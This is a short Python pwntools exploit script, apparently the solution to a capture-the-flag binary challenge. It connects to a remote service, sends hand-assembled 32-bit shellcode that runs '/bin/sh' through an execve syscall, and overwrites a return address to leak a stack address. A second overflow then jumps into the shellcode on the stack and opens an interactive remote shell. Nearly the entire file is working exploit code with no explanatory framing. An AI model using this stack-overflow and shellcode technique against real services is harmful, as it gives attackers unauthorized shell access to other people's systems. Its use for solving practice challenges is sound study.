#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
if not os.path.exists(prog):
    log.warning('{}: No such file or directory'.format(prog))
else:
    elf = ELF(prog); context.word_size = elf.elfclass

r = remote(HOST, PORT)

sc = asm("""
    xor     edx, edx
    mov     al, 0xb
    xchg    ebx, ecx
    sub     ebx, 0xc
    int     0x80
""").ljust(12, '\x00')
sc += '/bin/sh\x00'

exp = flat(
    sc.ljust(20, '\x00'), 0x8048087
)
raw_input()
r.sendafter('CTF:', exp)
stack = u32(r.recv()[:4])
log.info('stack: ' + hex(stack))

exp = 'a'*0x14 + p32(stack-0x1c)

r.send(exp)


r.interactive()
